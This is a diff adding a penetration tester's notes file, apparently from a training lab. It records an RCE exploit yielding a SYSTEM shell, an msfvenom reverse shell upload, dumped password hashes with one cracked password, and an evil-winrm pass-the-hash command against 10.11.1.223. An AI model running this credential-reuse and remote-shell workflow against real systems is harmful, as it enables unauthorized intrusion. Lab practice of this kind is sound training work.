@@ -1,0 +1,14 @@
+------------------
+NOTES
+------------------
+
+RCE exploit works -> SYSTEM shell
+
+upload a msfvenom rev shell, execute using exploit -> reverse shell
+
+checkout c:\subsonic next
+
+
+Admin:6b0e72ee64ea42ca092bd1a7449fa46e
+nicky:b40c7060e1bf68227131564a1bf33d48:nicky_90210
+evil-winrm -u "Administrator" -H 6b0e72ee64ea42ca092bd1a7449fa46e -i 10.11.1.223
